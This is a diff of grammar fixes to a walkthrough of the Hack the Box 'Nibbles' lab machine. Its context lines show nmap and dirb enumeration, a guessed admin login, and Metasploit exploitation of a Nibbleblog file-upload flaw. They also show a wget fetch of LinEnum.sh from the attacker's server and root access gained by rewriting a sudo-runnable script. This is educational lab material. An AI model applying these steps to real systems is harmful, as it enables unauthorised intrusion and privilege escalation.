@@ -15,7 +15,7 @@ Today lets see the Hack the Box Machine __Nibbles__
 <a href="/images/nibbles/nibbles.png"><img src="/images/nibbles/nibbles.png"></a>
 
 
-So lets start with a TCP SYN scan for service discovery using nmap to identify open ports and network services on the target machine.
+So let's start with a TCP SYN scan for service discovery using Nmap to identify open ports and network services on the target machine.
 
 ```console
 root@kali:~# nmap -sS -Pn -sV -T4 10.10.10.75
@@ -33,7 +33,7 @@ Nmap done: 1
 The port 80 and 22 are open in our target machine
 
 
-The port 80 is open,so lets dirb the target machine to identify other interesting directories or pages.
+The port 80 is open, so lets dirb the target machine to identify other interesting directories or pages.
 we can also use go-buster to brute-force and identify other interesting directories or pages.
 
 ```console
@@ -53,7 +53,7 @@ GENERATED WORDS: 4612
 ```
 there’s nothing much useful on the enumeration results.
 
-Now lets try to manually Enumerate the website
+Now let's try to manually Enumerate the website
 
 <a href="/images/Nibbles website 1.png"><img src="/images/nibbles/Nibbles website 1.png"></a>
 
@@ -74,7 +74,7 @@ Now lets try to login in manually and by guessing i got the __username__ as "__a
 
 <a href="/images/Nibbles website 5.png"><img src="/images/nibbles/Nibbles website 5.png"></a>
 
-Using searchploit i could find a Arbitary File Upload Vulnerability
+Using searchploit I could find an Arbitrary File Upload Vulnerability
 
 ```console
 root@kali:~# searchsploit nibbleblog
@@ -89,7 +89,7 @@ Shellcodes: No Result
 
 ```
 
-Now lets try to exploit this vulnerability using metasploit
+Now let's try to exploit this vulnerability using Metasploit
 
 ```console
 msf > search nibbleblog
@@ -103,7 +103,7 @@ Matching Modules
 
 ```
 
-Now lets load the exploit
+Now let's load the exploit
 
 ```console
 msf > use exploit/multi/http/nibbleblog_file_upload
@@ -208,7 +208,7 @@ lhost => 10.10.15.47
 
 ```
  
-Now lets run the exploit
+Now let's run the exploit
 
 ```console
 msf exploit(multi/http/nibbleblog_file_upload) > exploit
@@ -270,14 +270,14 @@ tools
 upc.sh
 user.txt
 ```
-Lets try to spawn a __TTY shell__ here from the "[__Netsec list__](https://netsec.ws/?p=337)"
+Let's try to spawn a __TTY shell__ here from the "[__Netsec list__](https://netsec.ws/?p=337)"
 
 ```console
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 nibbler@Nibbles:/home/nibbler/personal/stuff$ 
 
 ```
-Next we try to get the __LinEnum.sh__ file into our machine for that first i will run a php server in my local machine folder
+Next, we try to get the __LinEnum.sh__ file into our machine for that first I will run a PHP server in my local machine folder
 
 ```console
 root@kali:~/Desktop/PrivEscalation Enum# php -S 10.10.15.47:444
@@ -288,7 +288,7 @@ Press Ctrl-C to quit.
 [Wed Jun  6 19:00:04 2018] 10.10.10.75:35560 [200]: /LinEnum.sh
 
 ```
-Lets try to transfer the file into our machine using wget
+Let's try to transfer the file into our machine using wget
 
 ```console
 nibbler@Nibbles:/home/nibbler/personal/stuff$ wget http://10.10.15.47:444/LinEnum.sh -O /tmp/Linenum.sh
@@ -307,7 +307,7 @@ so we go the file inside our machine
 nibbler@Nibbles:/tmp$ chmod 777 Linenum.sh
 nibbler@Nibbles:/tmp$ sh ./Linenum.sh
 ```
-On running linux enum we got the following
+On running Linux enum we got the following
 
 ```console
 User nibbler may run the following commands on Nibbles:
@@ -315,14 +315,14 @@ User nibbler may run the following commands on Nibbles:
 
 ```
 
-so lets try to cd into that folder and see
+so let's try to cd into that folder and see
 
 ```console
 nibbler@Nibbles:/home/nibbler/personal/stuff$ ls
 nibbler@Nibbles:/home/nibbler/personal/stuff$ monitor.sh
 
 ```
-Now lets change the contents inside the monitor.sh and try to run it as the root
+Now let's change the contents inside the monitor.sh and try to run it as the root
 
 ```console
 nibbler@Nibbles:/home/nibbler/personal/stuff$ echo "cat /root/root.txt" > monitor.sh 
